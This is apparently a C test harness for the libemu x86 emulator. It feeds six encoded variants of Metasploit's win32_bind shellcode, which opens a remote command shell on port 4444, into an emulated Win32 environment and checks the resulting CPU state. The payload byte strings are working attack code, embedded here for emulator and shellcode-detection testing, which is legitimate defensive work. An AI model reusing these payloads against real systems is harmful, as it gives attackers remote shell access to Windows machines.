#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/select.h>
#include <unistd.h>
#include <stdio.h>

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <getopt.h>


#include <emu/emu.h>
#include <emu/emu_memory.h>
#include <emu/emu_cpu.h>
#include <emu/emu_log.h>
#include <emu/emu_cpu_data.h>
#include <emu/enviroment/win32/emu_env_w32.h>

#define CODE_OFFSET 0x417001

#define FAILED "\033[31;1mfailed\033[0m"
#define SUCCESS "\033[32;1msuccess\033[0m"

#define F(x) (1 << (x))


static struct run_time_options
{
	int verbose;
	int nasm_force;
	uint32_t steps;
	int testnumber;
} opts;

static const char *regm[] = {
	"eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"
};


	                         /* 0     1     2     3      4       5       6     7 */
static const char *flags[] = { "CF", "  ", "PF", "  " , "AF"  , "    ", "ZF", "SF", 
	                           "TF", "IF", "DF", "OF" , "IOPL", "IOPL", "NT", "  ",
	                           "RF", "VM", "AC", "VIF", "RIP" , "ID"  , "  ", "  ",
	                           "  ", "  ", "  ", "   ", "    ", "    ", "  ", "  "};


struct instr_test
{
	const char *instr;

	char  *code;
	uint16_t codesize;

	struct 
	{
		uint32_t reg[8];
		uint32_t		mem_state[2];
		uint32_t	eflags;
	} in_state;

	struct 
	{
		uint32_t reg[8];
		uint32_t		mem_state[2];
		uint32_t	eflags;
		uint32_t eip;
	} out_state;
};

#define FLAG(fl) (1 << (fl))

struct instr_test tests[] = 
{

/*  {
        .instr = "instr",
        .in_state.reg  = {0,0,0,0,0,0,0,0 },
        .in_state.mem_state = {0, 0},
        .out_state.reg  = {0,0,0,0,0,0,0,0 },
        .out_state.mem_state = {0, 0},
    },*/

	{	
		.instr ="win32_bind -  EXITFUNC=seh LPORT=4444 Size=317 Encoder=None http://metasploit.com",
		.code = 
		"\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45"
		"\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49"
		"\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d"
		"\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66"
		"\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61"
		"\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40"
		"\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32"
		"\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6"
		"\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09"
		"\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0"
		"\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff"
		"\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53"
		"\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff"
		"\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64"
		"\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89"
		"\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab"
		"\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51"
		"\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53"
		"\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6"
		"\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0",
		.codesize = 317,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},
	{
		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=Pex http://metasploit.com",
		.code =  

                "\x33\xc9\x83\xe9\xb0\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x47"
                "\x13\x2b\xc0\x83\xee\xfc\xe2\xf4\xbb\x79\xc0\x8d\xaf\xea\xd4\x3f"
                "\xb8\x73\xa0\xac\x63\x37\xa0\x85\x7b\x98\x57\xc5\x3f\x12\xc4\x4b"
                "\x08\x0b\xa0\x9f\x67\x12\xc0\x89\xcc\x27\xa0\xc1\xa9\x22\xeb\x59"
                "\xeb\x97\xeb\xb4\x40\xd2\xe1\xcd\x46\xd1\xc0\x34\x7c\x47\x0f\xe8"
                "\x32\xf6\xa0\x9f\x63\x12\xc0\xa6\xcc\x1f\x60\x4b\x18\x0f\x2a\x2b"
                "\x44\x3f\xa0\x49\x2b\x37\x37\xa1\x84\x22\xf0\xa4\xcc\x50\x1b\x4b"
                "\x07\x1f\xa0\xb0\x5b\xbe\xa0\x80\x4f\x4d\x43\x4e\x09\x1d\xc7\x90"
                "\xb8\xc5\x4d\x93\x21\x7b\x18\xf2\x2f\x64\x58\xf2\x18\x47\xd4\x10"
                "\x2f\xd8\xc6\x3c\x7c\x43\xd4\x16\x18\x9a\xce\xa6\xc6\xfe\x23\xc2"
                "\x12\x79\x29\x3f\x97\x7b\xf2\xc9\xb2\xbe\x7c\x3f\x91\x40\x78\x93"
                "\x14\x40\x68\x93\x04\x40\xd4\x10\x21\x7b\x3a\x9c\x21\x40\xa2\x21"
                "\xd2\x7b\x8f\xda\x37\xd4\x7c\x3f\x91\x79\x3b\x91\x12\xec\xfb\xa8"
                "\xe3\xbe\x05\x29\x10\xec\xfd\x93\x12\xec\xfb\xa8\xa2\x5a\xad\x89"
                "\x10\xec\xfd\x90\x13\x47\x7e\x3f\x97\x80\x43\x27\x3e\xd5\x52\x97"
                "\xb8\xc5\x7e\x3f\x97\x75\x41\xa4\x21\x7b\x48\xad\xce\xf6\x41\x90"
                "\x1e\x3a\xe7\x49\xa0\x79\x6f\x49\xa5\x22\xeb\x33\xed\xed\x69\xed"
                "\xb9\x51\x07\x53\xca\x69\x13\x6b\xec\xb8\x43\xb2\xb9\xa0\x3d\x3f"
                "\x32\x57\xd4\x16\x1c\x44\x79\x91\x16\x42\x41\xc1\x16\x42\x7e\x91"
                "\xb8\xc3\x43\x6d\x9e\x16\xe5\x93\xb8\xc5\x41\x3f\xb8\x24\xd4\x10"
                "\xcc\x44\xd7\x43\x83\x77\xd4\x16\x15\xec\xfb\xa8\xb7\x99\x2f\x9f"
                "\x14\xec\xfd\x3f\x97\x13\x2b\xc0",
		.codesize = 344,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	}, 
	{
		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=709 Encoder=PexAlphaNum http://metasploit.com",
		.code =  
	
				"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
                "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
                "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
                "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
                "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x56\x4b\x4e"
                "\x4d\x44\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x48"
                "\x4e\x46\x46\x52\x46\x52\x4b\x38\x45\x54\x4e\x33\x4b\x38\x4e\x47"
                "\x45\x30\x4a\x57\x41\x30\x4f\x4e\x4b\x38\x4f\x54\x4a\x51\x4b\x38"
                "\x4f\x45\x42\x52\x41\x50\x4b\x4e\x49\x44\x4b\x58\x46\x43\x4b\x58"
                "\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"
                "\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
                "\x46\x4f\x4b\x33\x46\x45\x46\x52\x4a\x42\x45\x47\x45\x4e\x4b\x48"
                "\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x56\x4b\x48\x4e\x50\x4b\x34"
                "\x4b\x48\x4f\x35\x4e\x41\x41\x50\x4b\x4e\x43\x50\x4e\x52\x4b\x38"
                "\x49\x58\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x33\x4b\x4d"
                "\x46\x56\x4b\x38\x43\x54\x42\x33\x4b\x48\x42\x34\x4e\x30\x4b\x58"
                "\x42\x57\x4e\x41\x4d\x4a\x4b\x38\x42\x54\x4a\x30\x50\x55\x4a\x46"
                "\x50\x48\x50\x54\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x56"
                "\x43\x55\x48\x46\x4a\x46\x43\x33\x44\x43\x4a\x46\x47\x57\x43\x57"
                "\x44\x53\x4f\x55\x46\x35\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
                "\x4e\x4f\x4b\x53\x42\x35\x4f\x4f\x48\x4d\x4f\x45\x49\x48\x45\x4e"
                "\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x50\x45\x55\x4c\x56\x44\x30"
                "\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x45"
                "\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x35\x43\x45\x43\x35\x43\x54"
                "\x43\x45\x43\x34\x43\x55\x4f\x4f\x42\x4d\x48\x46\x4a\x46\x41\x51"
                "\x4e\x35\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x49\x4a\x36\x46\x4a"
                "\x4c\x41\x42\x37\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
                "\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
                "\x49\x4e\x47\x45\x4f\x4f\x48\x4d\x43\x35\x45\x45\x4f\x4f\x42\x4d"
                "\x4a\x56\x45\x4e\x49\x44\x48\x58\x49\x34\x47\x45\x4f\x4f\x48\x4d"
                "\x42\x55\x46\x35\x46\x55\x45\x35\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
                "\x47\x4e\x49\x37\x48\x4c\x49\x47\x47\x35\x4f\x4f\x48\x4d\x45\x45"
                "\x4f\x4f\x42\x4d\x48\x36\x4c\x46\x46\x46\x48\x46\x4a\x56\x43\x46"
                "\x4d\x56\x49\x48\x45\x4e\x4c\x36\x42\x55\x49\x45\x49\x42\x4e\x4c"
                "\x49\x38\x47\x4e\x4c\x46\x46\x54\x49\x38\x44\x4e\x41\x43\x42\x4c"
                "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x34\x4e\x52"
                "\x43\x39\x4d\x48\x4c\x37\x4a\x33\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x56"
                "\x44\x37\x50\x4f\x43\x4b\x48\x31\x4f\x4f\x45\x37\x46\x34\x4f\x4f"
                "\x48\x4d\x4b\x55\x47\x55\x44\x55\x41\x45\x41\x55\x41\x45\x4c\x56"
                "\x41\x50\x41\x35\x41\x55\x45\x55\x41\x55\x4f\x4f\x42\x4d\x4a\x56"
                "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x36"
                "\x4f\x4f\x4f\x4f\x47\x33\x4f\x4f\x42\x4d\x4b\x48\x47\x45\x4e\x4f"
                "\x43\x38\x46\x4c\x46\x56\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
                "\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
                "\x4f\x4f\x42\x4d\x5a",

		.codesize = 709,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},

	{
		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com",
		.code =                  
				"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x02"
                "\x19\x61\x76\x83\xeb\xfc\xe2\xf4\xfe\x73\x8a\x3b\xea\xe0\x9e\x89"
                "\xfd\x79\xea\x1a\x26\x3d\xea\x33\x3e\x92\x1d\x73\x7a\x18\x8e\xfd"
                "\x4d\x01\xea\x29\x22\x18\x8a\x3f\x89\x2d\xea\x77\xec\x28\xa1\xef"
                "\xae\x9d\xa1\x02\x05\xd8\xab\x7b\x03\xdb\x8a\x82\x39\x4d\x45\x5e"
                "\x77\xfc\xea\x29\x26\x18\x8a\x10\x89\x15\x2a\xfd\x5d\x05\x60\x9d"
                "\x01\x35\xea\xff\x6e\x3d\x7d\x17\xc1\x28\xba\x12\x89\x5a\x51\xfd"
                "\x42\x15\xea\x06\x1e\xb4\xea\x36\x0a\x47\x09\xf8\x4c\x17\x8d\x26"
                "\xfd\xcf\x07\x25\x64\x71\x52\x44\x6a\x6e\x12\x44\x5d\x4d\x9e\xa6"
                "\x6a\xd2\x8c\x8a\x39\x49\x9e\xa0\x5d\x90\x84\x10\x83\xf4\x69\x74"
                "\x57\x73\x63\x89\xd2\x71\xb8\x7f\xf7\xb4\x36\x89\xd4\x4a\x32\x25"
                "\x51\x4a\x22\x25\x41\x4a\x9e\xa6\x64\x71\x70\x2a\x64\x4a\xe8\x97"
                "\x97\x71\xc5\x6c\x72\xde\x36\x89\xd4\x73\x71\x27\x57\xe6\xb1\x1e"
                "\xa6\xb4\x4f\x9f\x55\xe6\xb7\x25\x57\xe6\xb1\x1e\xe7\x50\xe7\x3f"
                "\x55\xe6\xb7\x26\x56\x4d\x34\x89\xd2\x8a\x09\x91\x7b\xdf\x18\x21"
                "\xfd\xcf\x34\x89\xd2\x7f\x0b\x12\x64\x71\x02\x1b\x8b\xfc\x0b\x26"
                "\x5b\x30\xad\xff\xe5\x73\x25\xff\xe0\x28\xa1\x85\xa8\xe7\x23\x5b"
                "\xfc\x5b\x4d\xe5\x8f\x63\x59\xdd\xa9\xb2\x09\x04\xfc\xaa\x77\x89"
                "\x77\x5d\x9e\xa0\x59\x4e\x33\x27\x53\x48\x0b\x77\x53\x48\x34\x27"
                "\xfd\xc9\x09\xdb\xdb\x1c\xaf\x25\xfd\xcf\x0b\x89\xfd\x2e\x9e\xa6"
                "\x89\x4e\x9d\xf5\xc6\x7d\x9e\xa0\x50\xe6\xb1\x1e\xf2\x93\x65\x29"
                "\x51\xe6\xb7\x89\xd2\x19\x61\x76",
		.codesize = 344,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},
	{
		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=ShikataGaNai http://metasploit.com",
		.code = 
		"\x31\xc9\xdd\xc1\xd9\x74\x24\xf4\xbb\xbe\x78\x0e\x3a\xb1\x51\x5e"
		"\x83\xc6\x04\x31\x5e\x11\x03\xe0\x69\xec\xcf\xe0\xe0\x1b\x62\xf0"
		"\x0c\x24\x82\xff\x8f\x50\x11\xdb\x6b\xec\xaf\x1f\xff\x8e\x2a\x27"
		"\xfe\x81\xbe\x98\x18\xd5\x9e\x06\x18\x02\x69\xcd\x2e\x5f\x6b\x3f"
		"\x7f\x9f\xf5\x13\x04\xdf\x72\x6c\xc4\x2a\x77\x73\x04\x41\x7c\x48"
		"\xdc\xb2\x55\xdb\x39\x31\xfa\x07\xc3\xad\x63\xcc\xcf\x7a\xe7\x8d"
		"\xd3\x7d\x1c\x32\xc0\xf6\x6b\x58\x3c\x15\x0d\x63\x0d\xfe\xa9\xe8"
		"\x2d\x30\xb9\xae\xbd\xbb\xcd\x32\x13\x30\x6d\x42\x35\x2f\xe0\x1c"
		"\xc7\x43\xac\x5f\x01\xfd\x1e\xf9\xc6\x31\x93\x6d\x60\x45\xe1\x32"
		"\xda\x56\xd5\xa4\x29\x45\x2a\x0f\xfe\x69\x05\x30\x77\x70\xcc\x4f"
		"\x6a\x73\x13\x1a\x1f\x86\xec\x74\xb7\x5f\x1b\x81\xe5\x37\xe3\xbf"
		"\xa5\xe4\x48\x6c\x19\x48\x3c\xd1\xce\xb1\x12\xb3\x98\x5c\xcf\x5d"
		"\x0a\xd6\x0e\x34\xc4\x4c\xca\x46\xd2\xda\x14\x70\xb6\xf4\xbb\x29"
		"\xb8\x25\x53\x75\xeb\xe8\x4d\x22\x0b\x22\xde\x99\x0c\x1b\x89\xc4"
		"\xba\x1a\x03\x51\xc2\xf5\xc4\x09\x68\xaf\x1b\x61\x03\x27\x03\xf8"
		"\xe2\xc1\x9c\x05\x3c\x64\xdc\x29\xa7\xed\x46\xaf\x40\x91\xeb\xa6"
		"\x74\x3f\xa4\xe1\x5f\x0c\xcd\xf6\xca\xc8\x47\x1a\x3b\x11\xa4\x70"
		"\xc2\xd3\x66\x7a\x79\xf8\xeb\x0f\x04\x38\xa7\xa4\x52\x50\xc5\x44"
		"\x17\xb7\xd6\xcd\x1c\x47\xfe\x76\xca\xe5\xae\xd9\xa5\x63\x50\x88"
		"\x14\x21\x03\xd5\x47\xa1\x0e\xf0\x6d\xfc\x02\xfd\xb8\x6a\x5a\xfe"
		"\x72\x94\x74\x8b\x2a\x96\xf6\x4f\xb0\x99\x2f\x1d\xc6\xb6\xb8\x51"
		"\xb2\x33\x66\xc2\x3c\xed\x67\x34",

		.codesize = 344,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},
	{
		.instr = "win32_bind -  EXITFUNC=seh LPORT=4444 Size=349 Encoder=JmpCallAdditive http://metasploit.com",
		.code =  
		"\xfc\xbb\x1e\x88\xb8\x04\xeb\x0c\x5e\x56\x31\x1e\xad\x01\xc3\x85"
		"\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xe2\xe2\x53\x49\xf2\x0a\x5c"
		"\xad\xfd\x8d\x28\x3e\x25\x6a\xa4\xfa\x19\xf9\xc6\x01\x19\xfc\xd9"
		"\x81\x96\xe6\xae\xc9\x08\x16\x5a\xbc\xc3\x2c\x17\x3e\x3d\x7d\xe7"
		"\xd8\x6d\xfa\x27\xae\x6a\xc2\x62\x42\x75\x06\x99\xa9\x4e\xd2\x7a"
		"\x7a\xc5\x3f\x09\x25\x01\xc1\xe5\xbc\xc2\xcd\xb2\xcb\x8b\xd1\x45"
		"\x27\x30\xc6\xce\x3e\x5a\x32\xcd\x21\x61\x0b\x36\xc5\xee\x2f\xf8"
		"\x8d\xb0\xa3\x73\xe1\x2c\x11\x08\x42\x44\x37\x67\xcd\x1a\xc9\x9b"
		"\x81\x5d\x03\x05\x71\xc7\xc4\xf9\x47\x6f\x62\x8d\x95\x30\xd8\x8e"
		"\x0a\xa6\x2b\x9d\x57\x0d\xfc\xa1\x7e\x2e\x75\xb8\x19\x51\x68\x4b"
		"\xe4\x04\x19\x4e\x17\x76\xb5\x97\xee\x83\xeb\x7f\x0e\xbd\xa7\x2c"
		"\xa3\x12\x1b\x90\x10\xd7\xc8\xe9\x47\xb1\x86\x04\x34\x5b\x04\xae"
		"\x25\x36\xc2\x14\xbf\x48\xd4\x02\x3f\x7e\xb0\xbc\xee\x2b\xba\x6d"
		"\x78\x77\xe9\xa0\x90\x20\x0d\x6a\x31\x9b\x0e\x43\xde\xc6\xb8\xe2"
		"\x56\x5f\xc4\x3d\x38\x0b\x6e\x97\x46\x63\x1d\x7f\x5e\xfa\xe4\xf9"
		"\xf7\x03\x3e\xac\x08\x2b\xd9\x25\x93\xad\x4e\xd9\x36\xb8\x6a\x77"
		"\x99\xe3\x5d\x44\x90\xf4\xf4\x10\x2a\x18\x39\x59\xdf\x76\xc4\x1b"
		"\x0d\x78\x7b\xb0\xde\x09\x06\xf0\x4b\xba\x5c\x68\xfe\x42\x11\x7f"
		"\x01\xcf\x12\x7f\x2b\x74\xcc\x2d\x85\xdb\xa3\xbb\x24\x8a\x12\x69"
		"\x76\xd3\x45\xf9\xd5\xf2\x63\x34\x76\xfb\xba\xa2\x86\xfc\x74\xcc"
		"\xa9\x89\x2c\xce\xc9\x49\xb6\xd1\x18\x03\xc8\xfe\xcd\x53\xbc\xfb"
		"\x52\xc0\x3e\xd5\x92\x36\xc0\xda\x6c\xb6\xc1\xda\x6c",
		.codesize = 349,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},
	/*{
		.instr = "",
		.code =  
		.codesize = 344,
		.in_state.reg  = {0,0xfffffe6c,0,0,0x12fe98,0x12ff74,0x12fe9c,0x12ff74}, // ollydbg
		.in_state.mem_state = {0, 0},
	},*/
};


int test(int n)
{
	int i=0;
	struct emu *e = emu_new();
	struct emu_cpu *cpu = emu_cpu_get(e);
	struct emu_memory *mem = emu_memory_get(e);
	struct emu_env_w32 *env = emu_env_w32_new(e);


	if (env == 0)
	{
		printf("%s \n", emu_strerror(e));
		printf("%s \n", strerror(emu_errno(e)));
		return -1;
	}

/*	uint32_t x;
	for (x=0x7c800000;x<0x7c902400;x++)
	{
		uint8_t b;
		emu_memory_read_byte(mem,x,&b);
		printf("%02x ",b);
		if (x % 16 == 0)
		{
			printf("\n");
		}
	}
	return 0;
*/


	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
	{
		if( n != -1 && i != n )
			continue;
			
		int failed = 0;


		printf("testing (#%d) '%s' \t", i, tests[i].instr);
		int j=0;

		/* set the registers to the initial values */
		for ( j=0;j<8;j++ )
		{
			emu_cpu_reg32_set(cpu,j ,tests[i].in_state.reg[j]);
		}
   	

		/* set the flags */
		emu_cpu_eflags_set(cpu,tests[i].in_state.eflags);


		/* write the code to the offset */
		int static_offset = CODE_OFFSET;
		for( j = 0; j < tests[i].codesize; j++ )
		{
			emu_memory_write_byte(mem, static_offset+j, tests[i].code[j]);
		}



		/* set eip to the code */
		emu_cpu_eip_set(emu_cpu_get(e), static_offset);

		/* run the code */
		if (opts.verbose == 1 )
		{
        	emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
			emu_cpu_debug_print(cpu);
			emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
		}
		
		int ret; //= emu_cpu_run(emu_cpu_get(e));

		for (j=0;j<opts.steps;j++)
		{
			emu_env_w32_eip_check(env);
			ret = emu_cpu_run(emu_cpu_get(e));
			

			if (opts.verbose == 1)
			{
				emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
				emu_cpu_debug_print(cpu);
				emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
			}
			if ( ret != 0 )
			{
				printf("cpu error %s\n", emu_strerror(e));
				break;
			}
		}
   

		if (opts.verbose == 1)
		{
			emu_log_level_set(emu_logging_get(e),EMU_LOG_DEBUG);
			emu_cpu_debug_print(cpu);
			emu_log_level_set(emu_logging_get(e),EMU_LOG_NONE);
		}
        	

		/* check the registers for the exptected values */

		for ( j=0;j<8;j++ )
		{
			if ( emu_cpu_reg32_get(cpu, j) ==  tests[i].out_state.reg[j] )
			{
				if (opts.verbose == 1)
					printf("\t %s "SUCCESS"\n",regm[j]);
			}
			else
			{
				printf("\t %s "FAILED" got 0x%08x expected 0x%08x\n",regm[j],emu_cpu_reg32_get(cpu, j),tests[i].out_state.reg[j]);
				failed = 1;
			}
		}


		/* check the memory for expected values */
		uint32_t value;

		if ( tests[i].out_state.mem_state[0] != 0 ||  tests[i].out_state.mem_state[1] != 0)
		{
			if ( emu_memory_read_dword(mem,tests[i].out_state.mem_state[0],&value) == 0 )
			{
				if ( value == tests[i].out_state.mem_state[1] )
				{
					if (opts.verbose == 1)
						printf("\t memory "SUCCESS" 0x%08x = 0x%08x\n",tests[i].out_state.mem_state[0], tests[i].out_state.mem_state[1]);
				}
				else
				{
					printf("\t memory "FAILED" at 0x%08x got 0x%08x expected 0x%08x\n",tests[i].out_state.mem_state[0],value, tests[i].out_state.mem_state[1]);
					failed = 1;
				}

			}
			else
			{
				printf("\tmemory "FAILED" emu says: '%s' when accessing %08x\n", strerror(emu_errno(e)),tests[i].out_state.mem_state[0]);
				failed = 1;
			}

		}

		/* check the cpu flags for expected values */
		if ( tests[i].out_state.eflags != emu_cpu_eflags_get(cpu) )
		{
			printf("\t flags "FAILED" got %08x expected %08x\n",emu_cpu_eflags_get(cpu),tests[i].out_state.eflags);
			for(j=0;j<32;j++)
			{
				uint32_t f = emu_cpu_eflags_get(cpu);
				if ( (tests[i].out_state.eflags & (1 << j)) != (f & (1 <<j)))
					printf("\t flag %s (bit %i) failed, expected %i is %i\n",flags[j], j, 
						   (tests[i].out_state.eflags & (1 << j)),
						   (f & (1 <<j)));
			}

			failed = 1;
		}else
		{
			if (opts.verbose == 1)
				printf("\t flags "SUCCESS"\n");
		}

		
		if( tests[i].out_state.eip != 0 && tests[i].out_state.eip != emu_cpu_eip_get(cpu) )
		{
			printf("\t %s "FAILED" got 0x%08x expected 0x%08x\n", "eip", emu_cpu_eip_get(cpu), tests[i].out_state.eip);
			failed = 1;
		}


		/* bail out on *any* error */
		if (failed == 0)
		{
			printf(SUCCESS"\n");
		}else
		{
			return -1;
		}
		
	}
	emu_free(e);
	return 0;
}

void cleanup()
{
	int i;
	for (i=0;i<sizeof(tests)/sizeof(struct instr_test);i++)
    	if (tests[i].code != NULL)
    		free(tests[i].code);
		
}

int main(int argc, char *argv[])
{
	memset(&opts,0,sizeof(struct run_time_options));

	opts.steps = 1;
	opts.testnumber = -1;

	while ( 1 )
	{	
		int c;
		int option_index = 0;
		static struct option long_options[] = {
			{"verbose"			, 0, 0, 'v'},
			{"nasm-force"		, 0, 0, 'n'},
			{"steps"			, 1, 0, 's'},
			{"testnumber"		, 1, 0, 't'},
			{0, 0, 0, 0}
		};

		c = getopt_long (argc, argv, "vns:t:", long_options, &option_index);
		if ( c == -1 )
			break;

		switch ( c )
		{
		case 'v':
			opts.verbose = 1;
			break;

		case 'n':
			opts.nasm_force = 1;
			break;

		case 's':
			opts.steps = atoi(optarg);
			break;

		case 't':
			opts.testnumber = atoi(optarg);
			break;


		default:
			printf ("?? getopt returned character code 0%o ??\n", c);
			break;
		}
	}



	if ( test(opts.testnumber) != 0 )
		return -1;

	cleanup();

//	dump_export_table();
	return 0;
}
